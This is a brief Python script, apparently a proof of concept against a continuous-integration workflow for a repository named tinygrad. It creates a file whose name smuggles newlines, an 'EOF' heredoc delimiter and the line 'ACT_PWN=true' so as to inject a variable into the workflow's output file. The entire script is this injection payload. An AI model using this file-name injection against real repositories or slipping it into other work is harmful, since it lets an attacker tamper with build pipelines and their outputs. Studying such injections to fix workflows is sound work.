import os
from pathlib import Path

os.makedirs('tinygrad', exist_ok=True)
prefix = 'A' * 200
malicious_name = f"{prefix}\nEOF\nACT_PWN=true\nloc_content<<EOF\n.py"
with open(os.path.join('tinygrad', malicious_name), 'w') as f:
    f.write('print(1)')
